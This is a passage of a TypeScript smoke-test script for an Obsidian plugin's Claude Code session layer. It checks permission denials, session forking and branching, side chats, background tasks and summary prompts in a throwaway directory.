// Headless check of the session layer: runs two turns against a throwaway directory.
// Turn 1 expects a plain text reply; turn 2 asks for a file-creating Bash command, which
// must reach the permission callback (denied here, so the file must not exist afterwards).
// Read-only commands such as `date` are auto-approved by Claude Code and never reach it.
// Build and run with `npm run smoke`.
//
// `--foreign-abort` replaces AbortController with one Node does not recognise as an
// EventTarget, which is what Obsidian's renderer hands the SDK; `--no-patch` additionally
// skips the setMaxListeners patch, reproducing the failure the patch exists for.
import type { PermissionMode } from '@anthropic-ai/claude-agent-sdk';
import { randomUUID } from 'crypto';
import { existsSync, mkdtempSync, rmSync } from 'fs';
import { homedir, tmpdir } from 'os';
import { delimiter, join, posix, win32 } from 'path';
import { patchSetMaxListenersForRenderer } from '../src/electronCompat';
import { branchChat, branchChatFrom, deleteSessionFile, entryBefore, listHistory, loadTranscript, projectFolder, renameSessionTitle, sessionTitle } from '../src/history';
import { messageSearchText } from '../src/chatText';
import { RemoteControlServer } from '../src/remoteControl';
import { neutralizeRemoteMedia } from '../src/safeMarkdown';
import { deflateSync } from 'zlib';
import { ClaudeSession, claudeEnv, configuredDefaults, detectClaudePath, findClaude, probeClaude, runOneShot, type UserContent } from '../src/session';
import { cleanReplacement, inlineEditPrompt, inlineEditSystem } from '../src/inlineEditPrompt';
import { summaryNote, summaryPrompt, summarySystem } from '../src/chatSummary';
import { vaultRelative } from '../src/toolSummary';
import { trackTask } from '../src/backgroundTasks';

class ForeignAbortSignal {
  aborted = false;
  reason: unknown = undefined;
  onabort: ((event: { type: string }) => void) | null = null;
  private readonly listeners = new Set<(event: { type: string }) => void>();
  addEventListener(type: string, listener: (event: { type: string }) => void): void {
    if (type === 'abort') this.listeners.add(listener);
  }
  removeEventListener(type: string, listener: (event: { type: string }) => void): void {
    if (type === 'abort') this.listeners.delete(listener);
  }
  throwIfAborted(): void {
    if (this.aborted) throw this.reason;
  }
  abortWith(reason: unknown): void {
    if (this.aborted) return;
    this.aborted = true;
    this.reason = reason;
    const event = { type: 'abort' };
    this.onabort?.(event);
    for (const listener of this.listeners) listener(event);
  }
}

class ForeignAbortController {
  readonly signal = new ForeignAbortSignal();
  abort(reason: unknown = new Error('This operation was aborted')): void {
    this.signal.abortWith(reason);
  }
}

if (process.argv.includes('--foreign-abort')) {
  (globalThis as unknown as { AbortController: unknown }).AbortController = ForeignAbortController;
  console.log('using foreign-realm AbortController');
  if (!process.argv.includes('--no-patch')) patchSetMaxListenersForRenderer();
  else console.log('setMaxListeners patch disabled');
}

// When launched from inside a Claude Code session, drop that session's markers.
for (const key of Object.keys(process.env)) {
  if (key === 'CLAUDECODE' || key.startsWith('CLAUDE_CODE_')) delete process.env[key];
}

const claudePath = detectClaudePath();
if (!claudePath) throw new Error('Claude Code executable not found');
const cwd = mkdtempSync(join(tmpdir(), 'vault-claude-smoke-'));

// A solid-colour PNG built by hand, to check that image blocks reach the model.
function crc32(buffer: Buffer): number {
  let crc = 0xffffffff;
  for (const byte of buffer) {
    crc ^= byte;
    for (let bit = 0; bit < 8; bit++) crc = crc & 1 ? (crc >>> 1) ^ 0xedb88320 : crc >>> 1;
  }
  return (crc ^ 0xffffffff) >>> 0;
}

function pngChunk(type: string, data: Buffer): Buffer {
  const length = Buffer.alloc(4);
  length.writeUInt32BE(data.length);
  const body = Buffer.concat([Buffer.from(type, 'ascii'), data]);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(body));
  return Buffer.concat([length, body, crc]);
}

function solidPng(width: number, height: number, [r, g, b]: [number, number, number]): Buffer {
  const header = Buffer.alloc(13);
  header.writeUInt32BE(width, 0);
  header.writeUInt32BE(height, 4);
  header[8] = 8;
  header[9] = 2;
  const row = Buffer.alloc(1 + width * 3);
  for (let x = 0; x < width; x++) row.set([r, g, b], 1 + x * 3);
  const pixels = deflateSync(Buffer.concat(Array.from({ length: height }, () => row)));
  const signature = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  return Buffer.concat([signature, pngChunk('IHDR', header), pngChunk('IDAT', pixels), pngChunk('IEND', Buffer.alloc(0))]);
}

const prompts: UserContent[] = [
  'Reply with exactly one word: pong',
  'Use the Bash tool to run the command `touch created-by-smoke.txt`. If it is denied, reply with exactly: denied',
  // Local command: its result text reports the model and the effort in use.
  '/model',
  [
    { type: 'image', source: { type: 'base64', media_type: 'image/png', data: solidPng(64, 64, [220, 30, 30]).toString('base64') } },
    { type: 'text', text: 'What colour is this image? Answer with one word.' },
  ],
];
const seen = new Set<string>();
const permissions: string[] = [];
let deltaChars = 0;
let turn = 0;

// `--mode <permissionMode>` and repeated `--deny <rule>` exercise the other permission modes.
const argValues = (flag: string) => process.argv.flatMap((arg, i) => (arg === flag ? [process.argv[i + 1]] : []));
const mode = (argValues('--mode')[0] ?? 'default') as PermissionMode;
const denyRules = argValues('--deny');
console.log(`mode: ${mode}; deny rules: ${denyRules.length ? denyRules.join(', ') : 'none'}`);

const session = new ClaudeSession(
  { cwd, claudePath, extraPath: [], permissionMode: mode, allowBypass: mode === 'bypassPermissions', denyRules },
  {
    onMessage(message) {
      seen.add(message.type === 'system' ? `system:${message.subtype}` : message.type);
      if (message.type === 'stream_event' && message.event.type === 'content_block_delta' && message.event.delta.type === 'text_delta') {
        deltaChars += message.event.delta.text.length;
      }
      if (message.type === 'system' && message.subtype === 'init') {
        console.log(`init model: ${message.model}; effort: ${message.effort ?? 'none'}`);
      }
      if (message.type === 'rate_limit_event') {
        console.log(`rate_limit_event: ${JSON.stringify(message.rate_limit_info)}`);
      }
      if (message.type === 'result') {
        const outcome = message.subtype === 'success' ? message.result : message.errors.join('; ');
        console.log(`turn ${turn + 1}: ${message.subtype} is_error=${message.is_error} result=${JSON.stringify(outcome)}`);
        turn += 1;
        void (async () => {
          if (turn === 1) {
            await reportMeters();
            // Effort and model changes mid-session must be accepted; the panel shows what it set.
            await session.setEffort('low');
            await session.setEffort(null);
            await session.setModel('claude-fable-5-1[1m]');
            await session.setModel(undefined);
            console.log('set effort low, then default; model Fable, then default');
          }
          if (turn < prompts.length) session.send(prompts[turn]);
          else session.close();
        })();
      }
    },
    async onPermission(request) {
      permissions.push(`${request.toolName}: ${JSON.stringify(request.input)}`);
      return { behavior: 'deny', message: 'Denied by the smoke test.' };
    },
    onEnd(error, stderrTail) {
      console.log(`session: ${session.sessionId}`);
      console.log(`message types: ${[...seen].join(', ')}`);
      console.log(`streamed text characters: ${deltaChars}`);
      console.log(`permission requests: ${permissions.length ? permissions.join(' | ') : 'none'}`);
      console.log(`file created despite denial: ${existsSync(join(cwd, 'created-by-smoke.txt'))}`);
      if (error) {
        console.error(`error: ${error.message}\n${stderrTail ?? ''}`);
        process.exitCode = 1;
      }
      void reportHistory();
    },
  },
);

async function reportMeters(): Promise<void> {
  const context = await session.contextUsage();
  if (context) {
    const byKind: Record<string, number> = {};
    for (const category of context.categories) byKind[category.kind] = (byKind[category.kind] ?? 0) + category.tokens;
    console.log(
      `context: total=${context.totalTokens} max=${context.maxTokens} rawMax=${context.rawMaxTokens} percentage=${context.percentage} autoCompactThreshold=${context.autoCompactThreshold} autoCompactEnabled=${context.isAutoCompactEnabled} byKind=${JSON.stringify(byKind)} model=${context.model}`,
    );
  }
  try {
    const plan = await session.planUsage();
    if (plan) {
      console.log(
        `plan: subscription=${plan.subscription_type} available=${plan.rate_limits_available} five_hour=${JSON.stringify(plan.rate_limits?.five_hour)} seven_day=${JSON.stringify(plan.rate_limits?.seven_day)}`,
      );
    }
  } catch (error) {
    console.log(`plan usage failed: ${String(error)}`);
  }
  const models = await session.supportedModels();
  console.log(`models: ${JSON.stringify(models?.map((m) => ({ value: m.value, resolved: m.resolvedModel, name: m.displayName })))}`);
}

async function reportHistory(): Promise<void> {
  const items = await listHistory(cwd, [], true);
  console.log(`history: ${JSON.stringify(items)}`);
  const original = session.sessionId;
  if (!original) return;
  const transcript = await loadTranscript(original, cwd);
  console.log(`transcript: ${transcript.map((m) => m.type).join(',')}`);
  if (process.argv.includes('--fork')) await checkFork(original, transcript.length);
}

// Resumes the finished session with forkSession and checks the original transcript is untouched.
async function checkFork(original: string, originalLength: number): Promise<void> {
  await new Promise<void>((resolve) => {
    const fork: ClaudeSession = new ClaudeSession(
      { cwd, claudePath: claudePath!, extraPath: [], permissionMode: 'default', resume: original, forkSession: true },
      {
        onMessage(message) {
          if (message.type === 'result') fork.close();
        },
        async onPermission() {
          return { behavior: 'deny', message: 'Denied by the smoke test.' };
        },
        onEnd() {
          resolve();
        },
      },
    );
    fork.send('Reply with exactly one word: forked');
  });
  const after = await loadTranscript(original, cwd);
  const sessions = await listHistory(cwd, [], true);
  console.log(`fork: original messages before=${originalLength} after=${after.length}; sessions in dir=${sessions.length}`);
}

const historyIndex = process.argv.indexOf('--history');
if (process.argv.includes('--usage')) {
  // Read-only: print the plan rate-limit windows reported for this account, then exit.
  void probeClaude({ cwd, claudePath, extraPath: [] }).then(({ plan }) => {
    console.log(JSON.stringify({ subscription: plan?.subscription_type, rate_limits: plan?.rate_limits }, null, 1));
  });
} else if (process.argv.includes('--rc')) {
  // Remote Control without the SDK's untyped enableRemoteControl: `--rc flag` passes the CLI's
  // documented --remote-control option, `--rc setting` the documented remoteControlAtStartup
  // setting. One short turn, kept open 25 s; prints the system messages, the rate-limit events
  // and anything that mentions claude.ai/code or remote control.
  const variant = argValues('--rc')[0] ?? 'flag';
  const started = Date.now();
  const rc: ClaudeSession = new ClaudeSession(
    {
      cwd,
      claudePath,
      extraPath: [],
      permissionMode: 'default',
      model: argValues('--model')[0] ?? 'haiku',
      extraArgs: variant === 'flag' ? { 'remote-control': 'Vault Claude RC test' } : undefined,
      settings: variant === 'setting' ? { remoteControlAtStartup: true } : undefined,
    },
    {
      onMessage(message) {
        if (message.type === 'stream_event') return;
        const at = `${((Date.now() - started) / 1000).toFixed(1)}s`;
        const text = JSON.stringify(message);
        if (message.type === 'system' && message.subtype === 'init') console.log(`${at} init: session ${message.session_id}`);
        else if (message.type === 'system' || message.type === 'rate_limit_event') console.log(`${at} ${message.type}/${'subtype' in message ? message.subtype : ''}: ${text.slice(0, 500)}`);
        else if (/claude\.ai\/code|remote/i.test(text)) console.log(`${at} ${message.type} mentions remote: ${text.slice(0, 500)}`);
        else if (message.type === 'result') console.log(`${at} result ${message.subtype}`);
      },
      async onPermission() {
        return { behavior: 'deny', message: 'No tools in this test.' };
      },
      onEnd(error) {
        console.log(`ended${error ? `: ${error.message}` : ''}`);
      },
    },
  );
  rc.send('Reply with exactly: ok');
  setTimeout(() => rc.close(), 40_000);
} else if (process.argv.includes('--fast')) {
  // Fast mode: which models support it, and what one short turn reports after the session opts
  // in through the fastMode flag setting (optionally `--model <id>`).
  const fast: ClaudeSession = new ClaudeSession(
    { cwd, claudePath, extraPath: [], permissionMode: 'default', model: argValues('--model')[0] },
    {
      onMessage(message) {
        if (message.type === 'system' && message.subtype === 'init') {
          console.log(`init: model=${message.model} fast_mode_state=${message.fast_mode_state} reason=${message.fast_mode_disabled_reason}`);
        }
        if (message.type === 'result') {
          console.log(`result: ${message.subtype} fast_mode_state=${message.fast_mode_state} reason=${message.fast_mode_disabled_reason}`);
          fast.close();
        }
      },
      async onPermission() {
        return { behavior: 'deny', message: 'No tools in this test.' };
      },
      onEnd(error) {
        if (error) console.log(`ended: ${error.message}`);
      },
    },
  );
  fast.ensureStarted();
  void (async () => {
    const models = (await fast.supportedModels()) ?? [];
    console.log(`models: ${models.map((model) => `${model.value}${model.supportsFastMode ? ' (fast)' : ''}`).join(', ')}`);
    await fast.setFastMode(true);
    fast.send('Reply with exactly: ok');
  })();
} else if (process.argv.includes('--branch')) {
  // Two turns; the stream's uuid for each turn's last assistant message must appear in the
  // transcript. Then a branch cut after turn 1 is resumed: it must know turn 1 only, and
  // the original transcript must be unchanged.
  const turnEnds: string[] = [];
  let lastAssistant: string | null = null;
  const branchPrompts = [
    'Remember the word APPLE. Reply with exactly: ok',
    'Use the Bash tool to run `echo BANANA`, then reply with exactly: done',
  ];
  let turns = 0;
  const source: ClaudeSession = new ClaudeSession(
    { cwd, claudePath, extraPath: [], permissionMode: 'default' },
    {
      onMessage(message) {
        if (message.type === 'assistant' && message.parent_tool_use_id === null) {
          lastAssistant = message.uuid;
          console.log(`assistant ${message.uuid} blocks=${message.message.content.map((block) => block.type).join('+')}`);
        }
        if (message.type === 'result') {
          turnEnds.push(lastAssistant ?? '');
          turns += 1;
          console.log(`turn ${turns}: ${message.subtype} result=${JSON.stringify(message.subtype === 'success' ? message.result : '')}`);
          if (turns < branchPrompts.length) source.send(branchPrompts[turns]);
          else source.close();
        }
      },
      async onPermission(request) {
        return { behavior: 'allow', updatedInput: request.input };
      },
      onEnd(error) {
        if (error) console.log(`error: ${error.message}`);
        void (async () => {
          const original = source.sessionId;
          if (!original) return;
          const transcript = await loadTranscript(original, cwd);
          const uuids = new Set(transcript.map((m) => m.uuid));
          console.log(`transcript entries: ${transcript.length}; stream turn ends found in transcript: ${turnEnds.map((id) => uuids.has(id)).join(', ')}`);
          const whole = await branchChat(original, cwd, 'Whole branch');
          console.log(`whole branch ${whole}: entries=${(await loadTranscript(whole, cwd)).length}`);
          const cut = await branchChat(original, cwd, 'Branch after turn 1', turnEnds[0]);
          console.log(`cut branch ${cut}: entries=${(await loadTranscript(cut, cwd)).length}; title=${await sessionTitle(cut, cwd)}`);
          await new Promise<void>((resolve) => {
            const resumed: ClaudeSession = new ClaudeSession(
              { cwd, claudePath: claudePath!, extraPath: [], permissionMode: 'default', resume: cut },
              {
                onMessage(message) {
                  if (message.type === 'system' && message.subtype === 'init') console.log(`resumed session id: ${message.session_id} (same as branch: ${message.session_id === cut})`);
                  if (message.type === 'result') {
                    console.log(`branch reply: ${JSON.stringify(message.subtype === 'success' ? message.result : message.subtype)}`);
                    resumed.close();
                  }
                },
                async onPermission() {
                  return { behavior: 'deny', message: 'Denied by the smoke test.' };
                },
                onEnd() {
                  resolve();
                },
              },
            );
            resumed.send('Which word did I ask you to remember, and have you run any commands in this conversation? Answer in one line.');
          });
          const after = await loadTranscript(original, cwd);
          console.log(`original entries before=${transcript.length} after=${after.length}`);
          await renameSessionTitle(cut, cwd, 'Renamed branch');
          console.log(`renamed branch title: ${await sessionTitle(cut, cwd)}`);
          const text = (await loadTranscript(original, cwd)).map(messageSearchText).filter(Boolean).join('\n');
          console.log(`search text has APPLE: ${text.includes('APPLE')}; has tool output BANANA only via reply: ${text.split('BANANA').length - 1}`);
          // Deleting a chat: the whole-copy branch made above, in this throwaway directory.
          const before = (await listHistory(cwd, [], true)).length;
          await deleteSessionFile(whole, cwd);
          const after2 = await listHistory(cwd, [], true);
          console.log(`deleted a chat: sessions ${before} -> ${after2.length}; still listed: ${after2.some((item) => item.id === whole)}`);
        })();
      },
    },
  );
  source.send(branchPrompts[0]);
} else if (process.argv.includes('--from')) {
  // Three turns, each sent under a uuid of the test's own, as the panel sends; then a copy from the
  // second prompt on (branchChatFrom, which finds the prompt by that uuid) is resumed: it must know
  // the second and third words only. The session folder is removed at the end.
  const words = ['APPLE', 'PEAR', 'PLUM'];
  const promptIds = words.map(() => randomUUID());
  let turns = 0;
  const send = (session: ClaudeSession) => session.send(`Remember the word ${words[turns]}. Reply with exactly: ok`, undefined, promptIds[turns] as never);
  const source: ClaudeSession = new ClaudeSession(
    { cwd, claudePath, extraPath: [], permissionMode: 'default', model: 'haiku' },
    {
      onMessage(message) {
        if (message.type !== 'result') return;
        turns += 1;
        console.log(`turn ${turns}: ${message.subtype}`);
        if (turns < words.length) send(source);
        else source.close();
      },
      async onPermission() {
        return { behavior: 'deny', message: 'Denied by the smoke test.' };
      },
      onEnd(error) {
        if (error) console.log(`error: ${error.message}`);
        void (async () => {
          const original = source.sessionId;
          if (!original) return;
          const copy = await branchChatFrom(original, cwd, 'From the second word', promptIds[1]);
          console.log(`copy ${copy}: entries ${(await loadTranscript(copy, cwd)).length}`);
          await new Promise<void>((resolve) => {
            const resumed: ClaudeSession = new ClaudeSession(
              { cwd, claudePath: claudePath!, extraPath: [], permissionMode: 'default', model: 'haiku', resume: copy },
              {
                onMessage(message) {
                  if (message.type !== 'result') return;
                  const reply = message.subtype === 'success' ? message.result : message.subtype;
                  console.log(`copy reply: ${JSON.stringify(reply)}; knows PEAR and PLUM, not APPLE: ${/PEAR/.test(reply) && /PLUM/.test(reply) && !/APPLE/.test(reply)}`);
                  resumed.close();
                },
                async onPermission() {
                  return { behavior: 'deny', message: 'Denied by the smoke test.' };
                },
                onEnd() {
                  resolve();
                },
              },
            );
            resumed.send('List every word I asked you to remember in this conversation, in capitals, on one line, and nothing else.');
          });
          rmSync(join(process.env.CLAUDE_CONFIG_DIR || join(homedir(), '.claude'), 'projects', projectFolder(cwd)), { recursive: true, force: true });
        })();
      },
    },
  );
  send(source);
} else if (process.argv.includes('--priority')) {
  // What `priority: 'now'` does to a message sent while a turn runs: is it taken up mid-turn,
  // does it interrupt, or does it wait for the turn to end? Prints each turn with the messages
  // it consumed. Optional `--priority-value next|later`.
  const value = (argValues('--priority-value')[0] ?? 'now') as 'now' | 'next' | 'later';
  const first = randomUUID();
  const second = randomUUID();
  const started = Date.now();
  const at = () => `${((Date.now() - started) / 1000).toFixed(1)}s`;
  let sentSecond = false;
  const race: ClaudeSession = new ClaudeSession(
    { cwd, claudePath, extraPath: [], permissionMode: 'bypassPermissions', allowBypass: true, model: 'sonnet' },
    {
      onMessage(message) {
        if (message.type === 'assistant' && message.parent_tool_use_id === null) {
          for (const block of message.message.content) {
            if (block.type === 'tool_use') console.log(`${at()} tool_use ${block.name}`);
            if (block.type === 'text' && block.text.trim()) console.log(`${at()} text ${JSON.stringify(block.text.trim().slice(0, 60))}`);
          }
          if (!sentSecond) {
            sentSecond = true;
            console.log(`${at()} sending the second message with priority=${value}`);
            race.send('Forget the counting. Reply with exactly: interjection', value, second);
          }
        }
        if (message.type === 'result') {
          const took = message.user_message_uuids ?? [];
          console.log(
            `${at()} result ${message.subtype}: consumed ${took.map((id) => (id === first ? 'first' : id === second ? 'second' : id.slice(0, 6))).join(', ') || 'none'}`,
          );
          if (took.includes(second) || message.subtype !== 'success') race.close();
        }
      },
      async onPermission(request) {
        return { behavior: 'allow', updatedInput: request.input };
      },
      onEnd(error) {
        if (error) console.log(`ended: ${error.message}`);
      },
    },
  );
  race.send('Use Bash to run `sleep 12`, then reply with exactly: counted', undefined, first);
} else if (process.argv.includes('--side-chat')) {
  // A side chat as the panel starts one: a fork of a finished chat, in Plan mode, asked about the
  // chat and asked to write a file. It must know the chat, write nothing, leave the chat as it was,
  // and be gone once its session is deleted.
  const model = argValues('--model')[0] ?? 'haiku';
  const run = (config: Partial<ConstructorParameters<typeof ClaudeSession>[0]>, prompt: string) =>
    new Promise<{ id: string | null; reply: string; permissions: string[] }>((resolve) => {
      let reply = '';
      const permissions: string[] = [];
      const chat: ClaudeSession = new ClaudeSession(
        { cwd, claudePath, extraPath: [], permissionMode: 'default', model, ...config },
        {
          onMessage(message) {
            if (message.type === 'result') {
              reply = message.subtype === 'success' ? message.result : message.errors.join('; ');
              chat.close();
            }
          },
          async onPermission(request) {
            permissions.push(request.toolName);
            return { behavior: 'deny', message: 'A side chat only reads.' };
          },
          onEnd: () => resolve({ id: chat.sessionId, reply, permissions }),
        },
      );
      chat.send(prompt);
    });
  void (async () => {
    const original = await run({}, 'Remember this code word for later: marmalade. Reply with exactly: noted');
    const before = original.id ? await loadTranscript(original.id, cwd) : [];
    const chosen = randomUUID();
    const side = await run(
      { permissionMode: 'plan', resume: original.id ?? undefined, forkSession: true, sessionId: chosen, appendSystemPrompt: ' This is a side chat: answer briefly. You can read files but not change them.' },
      'What was the code word? Then write it into a new file named side-chat.txt.',
    );
    const after = original.id ? await loadTranscript(original.id, cwd) : [];
    const listed = async () => (await listHistory(cwd, [], true)).map((item) => item.id);
    const withSide = await listed();
    if (side.id) await deleteSessionFile(side.id, cwd);
    const afterDelete = await listed();
    console.log(`chat: ${original.id} replied ${JSON.stringify(original.reply)}`);
    console.log(`side chat: ${side.id} (the id chosen for it: ${side.id === chosen}) replied ${JSON.stringify(side.reply)}; knows the word: ${/marmalade/i.test(side.reply)}; permission requests: ${side.permissions.join(', ') || 'none'}`);
    console.log(`file written: ${existsSync(join(cwd, 'side-chat.txt'))}; chat rows before ${before.length}, after ${after.length}`);
    console.log(`side session listed ${side.id !== null && withSide.includes(side.id)}, after deleting ${side.id !== null && afterDelete.includes(side.id)}; chat still listed ${original.id !== null && afterDelete.includes(original.id)}`);
  })();
} else if (process.argv.includes('--side-mid-turn')) {
  // A side chat forked while the chat's second reply is still streaming, cut where that reply's
  // prompt begins (as the panel does): it must know the first exchange and nothing of the second.
  // `--no-cut` forks the whole file instead, for comparison.
  const model = argValues('--model')[0] ?? 'haiku';
  const cut = !process.argv.includes('--no-cut');
  const prompt2 = randomUUID();
  let sent2 = false;
  let answering2 = false;
  let deltas = 0;
  let forked = false;
  setTimeout(() => {
    console.log('gave up after three minutes');
    process.exit(1);
  }, 180_000).unref();
  const main: ClaudeSession = new ClaudeSession(
    { cwd, claudePath, extraPath: [], permissionMode: 'default', model },
    {
      onMessage(message) {
        if (message.type === 'result' && !sent2) {
          sent2 = true;
          main.send('The code word is now apricot, not marmalade. Say so, then count from 1 to 150, one number per line.', undefined, prompt2);
        }
        // Frames name the prompts they answer; forked some way into the reply to the second.
        if (message.type === 'stream_event' && message.user_message_uuids?.includes(prompt2)) answering2 = true;
        if (!answering2 || message.type !== 'stream_event' || message.event.type !== 'content_block_delta') return;
        deltas += 1;
        if (deltas < 20 || forked) return;
        forked = true;
        void (async () => {
          const id = main.sessionId!;
          const end = cut ? await entryBefore(id, cwd, [prompt2]) : undefined;
          if (process.argv.includes('--show-rows')) {
            const { readFileSync, realpathSync } = await import('fs');
            const file = join(process.env.CLAUDE_CONFIG_DIR || join(homedir(), '.claude'), 'projects', realpathSync(cwd).replace(/[^a-zA-Z0-9]/g, '-'), `${id}.jsonl`);
            const rows = readFileSync(file, 'utf8').trim().split('\n').map((line) => JSON.parse(line) as { type?: string; uuid?: string; parentUuid?: string | null; promptId?: string });
            console.log(`prompt ${prompt2}; rows at fork time:\n${rows.map((r) => `  ${r.type} ${r.uuid ?? '-'} <- ${r.parentUuid ?? '-'}${r.promptId ? ` promptId ${r.promptId}` : ''}`).join('\n')}`);
          }
          const sideId = randomUUID();
          let reply = '';
          await new Promise<void>((resolve) => {
            const side: ClaudeSession = new ClaudeSession(
              { cwd, claudePath, extraPath: [], permissionMode: 'plan', model, resume: id, forkSession: true, sessionId: sideId, ...(end ? { resumeSessionAt: end } : {}) },
              {
                onMessage(m) {
                  if (m.type !== 'result') return;
                  reply = m.subtype === 'success' ? m.result : `error: ${m.errors.join('; ')}`;
                  side.close();
                },
                async onPermission() {
                  return { behavior: 'deny', message: 'A side chat only reads.' };
                },
                onEnd: () => resolve(),
              },
            );
            side.send('Which code word did I give you? Reply with the word only, or "none" if I gave none.');
          });
          const sideRows = await loadTranscript(sideId, cwd);
          console.log(`fork cut at ${end ?? 'the end of the file'} after ${deltas} text deltas; side chat replied ${JSON.stringify(reply)}; knows marmalade ${/marmalade/i.test(reply)}, sees apricot ${/apricot/i.test(reply)}; its rows: ${sideRows.length}`);
          await deleteSessionFile(sideId, cwd);
          main.close();
        })();
      },
      async onPermission() {
        return { behavior: 'deny', message: 'Denied by the smoke test.' };
      },
      onEnd(error) {
        if (error) console.log(`chat ended: ${error.message}`);
      },
    },
  );
  main.send('Remember this code word: marmalade. Reply with exactly: noted');
} else if (process.argv.includes('--row-uuid')) {
  // Whether the uuid a client gives a message becomes that message's row uuid in the session file,
  // so a reply's user_message_uuids can find the prompt it answers there.
  const sent = randomUUID();
  let echoed: string[] = [];
  const probe: ClaudeSession = new ClaudeSession(
    { cwd, claudePath, extraPath: [], permissionMode: 'default', model: 'sonnet' },
    {
      onMessage(message) {
        if (message.type === 'stream_event' && message.user_message_uuids && echoed.length === 0) echoed = message.user_message_uuids;
        if (message.type !== 'result') return;
        void (async () => {
          const id = probe.sessionId;
          const rows = id ? await loadTranscript(id, cwd) : [];
          const row = rows.find((candidate) => candidate.type === 'user' && candidate.uuid === sent);
          console.log(`stream frames name the sent uuid: ${echoed.includes(sent)}; the session file has a user row with it: ${row !== undefined}`);
          probe.close();
        })();
      },
      async onPermission() {
        return { behavior: 'deny', message: 'Denied by the smoke test.' };
      },
      onEnd(error) {
        if (error) console.log(`ended: ${error.message}`);
      },
    },
  );
  probe.send('Reply with exactly: ok', undefined, sent);
} else if (process.argv.includes('--resume-leftover')) {
  // The sequence behind a duplicated prompt: a background task is killed with its process, and the
  // chat is resumed with a new message. Prints each result's and each reply frame's message ids, to
  // show which turn answers the message sent and which is Claude Code's own.
  const started = Date.now();
  const at = () => `${((Date.now() - started) / 1000).toFixed(1)}s`;
  const mine = randomUUID();
  let sessionId: string | null = null;
  const settings = { cwd, claudePath, extraPath: [], permissionMode: 'bypassPermissions' as PermissionMode, allowBypass: true, model: 'sonnet' };
  const quiet = { async onPermission(request: { input: Record<string, unknown> }) { return { behavior: 'allow' as const, updatedInput: request.input }; }, onEnd() {} };
  const first: ClaudeSession = new ClaudeSession(settings, {
    ...quiet,
    onMessage(message) {
      if (message.type === 'system' && message.subtype === 'init') sessionId = message.session_id;
      if (message.type === 'result') {
        console.log(`${at()} first session: reply done; closing it with the background task still running`);
        first.close();
        setTimeout(resume, 1500);
      }
    },
  });
  first.send('Use Bash with run_in_background set to true to run `sleep 120`. Then reply with exactly: started');
  let framesSeen = 0;
  const resume = () => {
    console.log(`${at()} resuming ${sessionId?.slice(0, 8)} and sending a message with id ${mine.slice(0, 8)}`);
    const second: ClaudeSession = new ClaudeSession({ ...settings, resume: sessionId ?? undefined }, {
      ...quiet,
      onMessage(message) {
        const ids = (message as { user_message_uuids?: string[] }).user_message_uuids;
        const label = (list: string[] | undefined) => (list === undefined ? 'absent' : `[${list.map((id) => (id === mine ? 'mine' : id.slice(0, 8))).join(', ')}]`);
        if ((message.type === 'stream_event' || message.type === 'assistant') && message.parent_tool_use_id === null && framesSeen < 3) {
          framesSeen += 1;
          console.log(`${at()} ${message.type} frame ids ${label(ids)}`);
        }
        if (message.type === 'user' && typeof message.message.content === 'string') console.log(`${at()} user ${JSON.stringify(message.message.content.slice(0, 60))}`);
        if (message.type === 'result') {
          console.log(`${at()} result ${message.subtype} error=${message.is_error} ids ${label(ids)} duration ${message.duration_ms} ms`);
          if (ids?.includes(mine)) second.close();
        }
      },
    });
    second.send('Is the background command still running? Answer in one short sentence.', undefined, mine);
    setTimeout(() => second.close(), 60_000);
  };
} else if (process.argv.includes('--bgtask')) {
  // A task Claude sends to the background: which task messages report it, whether the turn ends
  // while it runs, and whether Claude Code starts a turn of its own when it finishes. `--bgtask-kind
  // agent` uses a background subagent instead of a background shell command.
  const kind = argValues('--bgtask-kind')[0] ?? 'bash';
  const tasks = new Set<string>();
  const started = Date.now();
  const at = () => `${((Date.now() - started) / 1000).toFixed(1)}s`;
  let results = 0;
  const timeout = setTimeout(() => {
    console.log(`${at()} no second turn within 90 s; tasks still tracked: ${tasks.size}`);
    bg.close();
  }, 90_000);
  const bg: ClaudeSession = new ClaudeSession(
    { cwd, claudePath, extraPath: [], permissionMode: 'bypassPermissions', allowBypass: true, model: 'sonnet' },
    {
      onMessage(message) {
        if (trackTask(tasks, message)) console.log(`${at()} tracked tasks: ${tasks.size}`);
        if (message.type === 'system' && message.subtype.startsWith('task_')) {
          const { type: _type, uuid: _uuid, session_id: _session, ...rest } = message as unknown as Record<string, unknown>;
          console.log(`${at()} ${message.subtype} ${JSON.stringify(rest).slice(0, 220)}`);
        }
        if (message.type === 'assistant' && message.parent_tool_use_id === null) {
          for (const block of message.message.content) {
            if (block.type === 'tool_use') console.log(`${at()} tool_use ${block.name} ${JSON.stringify(block.input).slice(0, 100)}`);
            if (block.type === 'text' && block.text.trim()) console.log(`${at()} text ${JSON.stringify(block.text.trim().slice(0, 60))}`);
          }
        }
        if (message.type === 'result') {
          results += 1;
          console.log(`${at()} result #${results} ${message.subtype}; tracked tasks: ${tasks.size}`);
          if (results >= 2) {
            clearTimeout(timeout);
            bg.close();
          }
        }
      },
      async onPermission(request) {
        return { behavior: 'allow', updatedInput: request.input };
      },
      onEnd(error) {
        console.log(`${at()} ended${error ? `: ${error.message}` : ''}`);
      },
    },
  );
  bg.send(
    kind === 'agent'
      ? 'Use the Agent tool with run_in_background set to true (subagent_type general-purpose) and this prompt: "Run `sleep 10` with Bash, then reply with exactly: done". Then reply with exactly: started. When its result arrives, reply with exactly: seen'
      : 'Use Bash with run_in_background set to true to run `sleep 10 && echo finished`. Then reply with exactly: started. When it finishes, reply with exactly: seen',
  );
} else if (process.argv.includes('--summary')) {
  // One summary request on a short made-up conversation (optionally `--model <id>`); prints the note.
  const conversation = [
    '> **You**\n>\n> Rename the Garden timeline note to use the project suffix, and fix the two links to it.',
    'Renamed `Timeline.md` to `Timeline — Garden.md` and updated the links in `Garden.md` and `Open Questions — Garden.md`. The link check passes.',
    '> **You**\n>\n> Also add the 2026-09-12 planting to the timeline.',
    'Added a 2026-09-12 entry: planted the tomatoes; decided to leave the north bed fallow this year. Open: order more compost.',
  ].join('\n\n');
  const system = summarySystem('Every note has frontmatter with `tags: [...]` and `updated: YYYY-MM-DD`, and `model: <model name>` when a model wrote it.');
  const prompt = summaryPrompt({ title: 'Timeline rename — summary', date: '2026-09-15', sessionId: 'test-session', model: 'Sonnet 5', transcript: conversation });
  const started = Date.now();
  void runOneShot({ cwd, claudePath, extraPath: [] }, { system, prompt, model: argValues('--model')[0], effort: 'medium' }, () => undefined, new AbortController().signal)
